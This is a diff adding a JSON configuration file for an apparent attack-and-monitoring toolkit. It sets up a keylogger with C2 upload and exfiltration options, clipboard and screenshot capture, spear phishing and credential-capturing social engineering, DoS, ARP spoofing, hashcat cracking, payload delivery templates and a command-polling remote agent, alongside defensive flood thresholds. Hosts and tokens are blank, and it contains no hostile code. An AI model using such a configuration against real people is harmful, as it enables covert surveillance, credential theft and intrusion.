@@ -1,0 +1,148 @@
+{
+  "version": "1.0.0",
+  "auto_start": false,
+  "auto_block_enabled": false,
+  "auto_block_threshold": 5,
+  "scan_timeout": 30,
+  "report_format": "html",
+  "generate_graphics": true,
+  "keylogger": {
+    "enabled": false,
+    "hotkey": "f10",
+    "log_file": ".mysterious_cyclopus/keylog.txt",
+    "c2_server": "",
+    "upload_interval": 30,
+    "exfil_methods": ["file", "email", "c2"],
+    "screenshot_interval": 60,
+    "capture_clipboard": true
+  },
+  "web": {
+    "enabled": true,
+    "port": 5000,
+    "host": "0.0.0.0",
+    "secret_key": "CHANGE_ME_RANDOM_STRING",
+    "require_auth": true,
+    "username": "admin",
+    "password_hash": ""
+  },
+  "email": {
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "smtp_username": "",
+    "smtp_password": "",
+    "from_email": "",
+    "tls": true
+  },
+  "discord": {
+    "enabled": false,
+    "token": "",
+    "channel_id": "",
+    "prefix": "!",
+    "admin_role": "Admin"
+  },
+  "telegram": {
+    "enabled": false,
+    "bot_token": "",
+    "chat_id": "",
+    "prefix": "/"
+  },
+  "slack": {
+    "enabled": false,
+    "bot_token": "",
+    "app_token": "",
+    "channel_id": "",
+    "prefix": "!"
+  },
+  "signal": {
+    "enabled": false,
+    "phone_number": "",
+    "group_id": "",
+    "prefix": "!"
+  },
+  "whatsapp": {
+    "enabled": false,
+    "phone_number": "",
+    "prefix": "!"
+  },
+  "google_chat": {
+    "enabled": false,
+    "webhook_url": "",
+    "space_id": "",
+    "prefix": "/"
+  },
+  "imessage": {
+    "enabled": false,
+    "phone_numbers": [],
+    "prefix": "!"
+  },
+  "monitoring": {
+    "enabled": true,
+    "port_scan_threshold": 10,
+    "syn_flood_threshold": 100,
+    "http_flood_threshold": 200
+  },
+  "traffic_generation": {
+    "enabled": true,
+    "max_duration": 300,
+    "max_packet_rate": 1000,
+    "allow_floods": false
+  },
+  "social_engineering": {
+    "enabled": true,
+    "default_port": 8080,
+    "capture_credentials": true,
+    "auto_shorten_urls": true
+  },
+  "ssh": {
+    "enabled": true,
+    "default_timeout": 30,
+    "max_connections": 5
+  },
+  "spear_phishing": {
+    "enabled": true,
+    "track_opens": true,
+    "track_clicks": true
+  },
+  "dos": {
+    "enabled": true,
+    "max_threads": 100,
+    "default_timeout": 60
+  },
+  "agent": {
+    "enabled": false,
+    "server_url": "",
+    "heartbeat_interval": 30,
+    "command_poll_interval": 5
+  },
+  "network_monitor": {
+    "enabled": true,
+    "interface": "eth0",
+    "promiscuous": false,
+    "packet_capture_limit": 1000
+  },
+  "deployment": {
+    "enabled": true,
+    "pdf_template": "",
+    "email_template": "",
+    "link_expiry": 3600,
+    "download_url": ""
+  },
+  "cracking": {
+    "enabled": true,
+    "hashcat_path": "hashcat",
+    "wordlist_path": "/usr/share/wordlists/rockyou.txt",
+    "default_hash_type": 0,
+    "max_threads": 4
+  },
+  "arp_spoofing": {
+    "enabled": true,
+    "interface": "eth0",
+    "enable_ip_forward": true,
+    "sniff_interval": 60
+  },
+  "docker": {
+    "enabled": true,
+    "scan_timeout": 300,
+    "benchmark_enabled": true
+  }
+}
